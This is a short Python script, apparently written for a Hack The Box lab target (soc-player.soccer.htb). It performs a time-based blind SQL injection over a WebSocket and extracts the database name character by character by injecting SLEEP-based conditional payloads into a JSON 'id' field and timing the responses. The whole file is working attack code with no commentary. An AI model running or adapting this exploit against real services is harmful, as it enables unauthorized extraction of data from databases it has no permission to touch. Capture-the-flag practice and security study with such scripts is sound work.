import json
import websocket
import time
import string

url = "ws://soc-player.soccer.htb:9091/"
charset = string.ascii_lowercase + string.digits + "_"
db_name = ""
max_len = 20

for i in range(1, max_len+1):
    for c in charset:
        payload = f"1 OR IF(SUBSTRING(DATABASE(),{i},1)='{c}', SLEEP(5), 0)# "
        ws = websocket.create_connection(url)
        data = json.dumps({"id": payload})

        start = time.time()
        ws.send(data)
        result = ws.recv()
        elapsed = time.time() - start
        ws.close()

        print(f"[{i}] Trying '{c}'... {elapsed:.2f}s")

        if elapsed > 4.5:
            db_name += c
            print(f"--> Found character {i}: {c}")
            break
    else:
        print("End of DB name?")
        break

print("Database name:", db_name)
